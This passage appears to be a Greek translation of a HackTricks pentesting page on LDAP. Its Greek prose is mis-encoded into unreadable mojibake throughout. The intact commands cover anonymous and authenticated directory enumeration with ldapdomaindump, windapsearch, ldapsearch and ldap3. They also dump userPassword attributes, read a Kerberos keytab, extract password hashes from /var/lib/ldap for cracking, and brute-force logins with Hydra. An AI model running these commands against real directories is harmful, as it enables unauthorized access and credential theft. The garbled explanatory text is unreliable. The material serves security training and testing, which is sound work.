Î©ÏƒÏ„ÏŒÏƒÎ¿, Î¿Î¹ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î­Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡Î¿Ï…Î½ Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± **Î´Î¹Î±Î¼Î¿ÏÏ†ÏÏƒÎ¿Ï…Î½ Î¼Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î³Î¹Î± Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ Î±Î½ÏÎ½Ï…Î¼ÎµÏ‚ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚** ÎºÎ±Î¹ Î½Î± Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ®ÏƒÎ¿Ï…Î½ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î±Ï€ÏŒ ÏŒ,Ï„Î¹ Î±ÏÏ‡Î¹ÎºÎ¬ ÎµÎ¯Ï‡Î±Î½ ÏƒÎºÎ¿Ï€ÏŒ, Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Î­Ï„ÏƒÎ¹ ÏƒÎµ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÏŒÎ»Î± Ï„Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± ÏƒÏ„Î¿Î½ AD.

## ÎˆÎ³ÎºÏ…ÏÎ± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±

Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ Î­Î³ÎºÏ…ÏÎ± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î³Î¹Î± Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® LDAP, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿Î½ Domain Admin Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [Î’Î¯Î±Î¹Î· Î”ÏÎ½Î±Î¼Î·](../generic-methodologies-and-resources/brute-force.md#ldap)

## Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·

### Î‘Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„ÏŒ, Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ **Î´Î·Î¼ÏŒÏƒÎ¹ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚** (ÏŒÏ€Ï‰Ï‚ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Ï„Î¿Î¼Î­Î±)**:**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>Î”ÎµÎ¯Ï„Îµ Ï„Î·Î½ Î±Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· LDAP Î¼Îµ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î·Ï‚ Python</summary>

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î½Î± **Î±Ï€Î±ÏÎ¹Î¸Î¼Î®ÏƒÎµÏ„Îµ Î­Î½Î± LDAP Î¼Îµ Î® Ï‡Ï‰ÏÎ¯Ï‚ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Python**: `pip3 install ldap3`

Î ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÏ„Îµ Ï€ÏÏÏ„Î± Î½Î± **ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ Ï‡Ï‰ÏÎ¯Ï‚** Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±:
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
Î•Î¬Î½ Î· Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ `True` ÏŒÏ€Ï‰Ï‚ ÏƒÏ„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± **ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±** Ï„Î¿Ï… LDAP (ÏŒÏ€Ï‰Ï‚ Ï„Î¿ **Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Î¿Î½Î¿Î¼Î±ÏƒÎ¯Î±Ï‚** Î® Ï„Î¿ **ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Ï„Î¿Î¼Î­Î±**) Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î±Ï€ÏŒ:
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
Î‘Ï†Î¿Ï Î­Ï‡ÎµÏ„Îµ Ï„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Ï€Î¹Î¿ ÏƒÏ…Î½Î±ÏÏ€Î±ÏƒÏ„Î¹ÎºÎ­Ï‚ ÎµÏÏ‰Ï„Î®ÏƒÎµÎ¹Ï‚. Î‘Ï…Ï„Î® Î· Î±Ï€Î»Î® ÎµÏÏÏ„Î·ÏƒÎ· Î¸Î± ÏƒÎ±Ï‚ Î´ÎµÎ¯Î¾ÎµÎ¹ ÏŒÎ»Î± Ï„Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± ÏƒÏ„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿:
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
Î‰ **Î±Î½Ï„Î»Î®ÏƒÏ„Îµ** Î¿Î»ÏŒÎºÎ»Î·ÏÎ¿ Ï„Î¿ ldap:
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch) ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Python Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± **Î±Ï€Î±ÏÎ¹Î¸Î¼Î®ÏƒÎµÎ¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚, Î¿Î¼Î¬Î´ÎµÏ‚ ÎºÎ±Î¹ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î­Ï‚ Î±Ï€ÏŒ Î­Î½Î± Ï€ÎµÎ´Î¯Î¿ Windows** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î± LDAP.
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± ÎºÎµÎ½Î¬ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î® ÎµÎ¬Î½ Î¿Î¹ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î¬ ÏƒÎ±Ï‚ ÎµÎ¯Î½Î±Î¹ Î­Î³ÎºÏ…ÏÎ±:
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
Î•Î¬Î½ Î²ÏÎµÎ¯Ï„Îµ ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… Î»Î­ÎµÎ¹ ÏŒÏ„Î¹ "_Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¸ÎµÎ¯ Î· _bind_" ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± ÎµÎ¯Î½Î±Î¹ ÎµÏƒÏ†Î±Î»Î¼Î­Î½Î±.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ¾Î¬Î³ÎµÏ„Îµ **Ï„Î± Ï€Î¬Î½Ï„Î± Î±Ï€ÏŒ Î­Î½Î±Î½ Ï„Î¿Î¼Î­Î±** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
Î•Î¾Î±Î³Ï‰Î³Î® **Ï‡ÏÎ·ÏƒÏ„ÏÎ½**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
Î•Î¾Î±Î³Ï‰Î³Î® **Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„ÏÎ½**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Î•Î¾Î±Î³Ï‰Î³Î® **Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ Î¼Î¿Ï…**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Î•Î¾Î±Î³Ï‰Î³Î® **Domain Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Î•Î¾Î±Î³Ï‰Î³Î® **Domain Users**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Î•Î¾Î±Î³Ï‰Î³Î® **Enterprise Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Î•Î¾Î±Î³Ï‰Î³Î® **Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î­Ï‚**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Î•Î¾Î±Î³Ï‰Î³Î® **ÎŸÎ¼Î¬Î´Î±Ï‚ Î‘Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î·Ï‚ Î•Ï€Î¹Ï†Î¬Î½ÎµÎ¹Î±Ï‚ Î•ÏÎ³Î±ÏƒÎ¯Î±Ï‚**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Î“Î¹Î± Î½Î± Î´ÎµÎ¯Ï„Îµ Î±Î½ Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® grep Î¼ÎµÏ„Î¬ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î¼Î¯Î±Ï‚ Î±Ï€ÏŒ Ï„Î¹Ï‚ ÎµÏÏ‰Ï„Î®ÏƒÎµÎ¹Ï‚:
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
#### pbis

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ **pbis** Î±Ï€ÏŒ ÎµÎ´Ï: [https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/) ÎºÎ±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÎµÎ³ÎºÎ±Î¸Î¯ÏƒÏ„Î±Ï„Î±Î¹ ÏƒÏ„Î¿ `/opt/pbis`.\
Î¤Î¿ **Pbis** ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± Î»Î¬Î²ÎµÏ„Îµ ÎµÏÎºÎ¿Î»Î± Î²Î±ÏƒÎ¹ÎºÎ­Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚:
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## Î“ÏÎ±Ï†Î¹ÎºÎ® Î´Î¹ÎµÏ€Î±Ï†Î®

### Apache Directory

[**ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿ Apache Directory Î±Ï€ÏŒ ÎµÎ´Ï**](https://directory.apache.org/studio/download/download-linux.html). ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± [Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€ÏÏ‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ ÎµÎ´Ï](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s).

### jxplorer

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Î¼Î¹Î± Î³ÏÎ±Ï†Î¹ÎºÎ® Î´Î¹ÎµÏ€Î±Ï†Î® Î¼Îµ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® LDAP ÎµÎ´Ï: [http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÎµÎ³ÎºÎ±Î¸Î¯ÏƒÏ„Î±Ï„Î±Î¹ ÏƒÏ„Î¿: _/opt/jxplorer_

![](<../.gitbook/assets/image (22) (1).png>)

### Godap

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„ÏŒ ÎµÎ´Ï: [https://github.com/Macmod/godap](https://github.com/Macmod/godap)

## Î Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î¼Î­ÏƒÏ‰ kerberos

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ `ldapsearch` Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯Ï„Îµ** ÎµÎ½Î±Î½Ï„Î¯Î¿Î½ Ï„Î¿Ï… **kerberos Î±Î½Ï„Î¯** Î³Î¹Î± Ï„Î¿ **NTLM** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `-Y GSSAPI`

## POST

Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± Î±ÏÏ‡ÎµÎ¯Î± ÏŒÏ€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡Î¿Î½Ï„Î±Î¹ Î¿Î¹ Î²Î¬ÏƒÎµÎ¹Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ (Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î¿ _/var/lib/ldap_). ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ¾Î¬Î³ÎµÏ„Îµ Ï„Î¹Ï‚ ÎºÎ±Ï„Î±ÎºÎµÏÎ¼Î±Ï„Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚:
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„ÏÎ¿Ï†Î¿Î´Î¿Ï„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ John Î¼Îµ Ï„Î¿ hash Ï„Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ (Î±Ï€ÏŒ '{SSHA}' Î­Ï‰Ï‚ 'structural' Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Ï„Î¿ 'structural').

### Î‘ÏÏ‡ÎµÎ¯Î± Î”Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚

* Î“ÎµÎ½Î¹ÎºÎ¬
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 server
* V3.sas.oc
* Microsoft Active Directory server
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP directory server
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif

## Î‘Ï…Ï„ÏŒÎ¼Î±Ï„ÎµÏ‚ Î•Î½Ï„Î¿Î»Î­Ï‚ HackTricks
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
